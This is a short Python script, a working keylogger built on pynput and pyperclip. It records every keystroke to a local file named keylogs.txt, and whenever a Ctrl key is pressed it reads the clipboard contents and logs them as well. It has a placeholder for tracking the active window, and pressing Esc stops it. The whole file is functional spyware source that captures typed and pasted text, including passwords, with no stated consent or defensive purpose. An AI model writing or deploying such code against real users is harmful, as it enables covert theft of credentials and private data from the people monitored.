from pynput import keyboard
import pyperclip

# Current active window variable
current_window = None

def get_current_process():
    """
    This function needs an alternative implementation for Linux.
    Currently, it only serves as a placeholder for a Windows-specific function.
    """
    print("This function is specific to Windows and needs alternative implementation for Linux")

def on_press(key):
    """
    Handles key press events.
    Records the pressed key and checks for clipboard content when Ctrl+V is pressed.
    """
    global current_window
    try:
        if key.char:  # Check if the key is a standard character
            print(key.char)
            with open("keylogs.txt", 'a') as file:
                file.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            clipboard = pyperclip.paste()
            if clipboard:
                print(f"[PASTE] - {clipboard}")
                with open("keylogs.txt", 'a') as file:
                    file.write(f"\n[PASTE] - {clipboard}\n")
        else:
            print(f"{key}")
            with open("keylogs.txt", 'a') as file:
                file.write(f"{key}")

def on_release(key):
    """
    Handles key release events.
    Stops the listener if the 'Esc' key is pressed.
    """
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
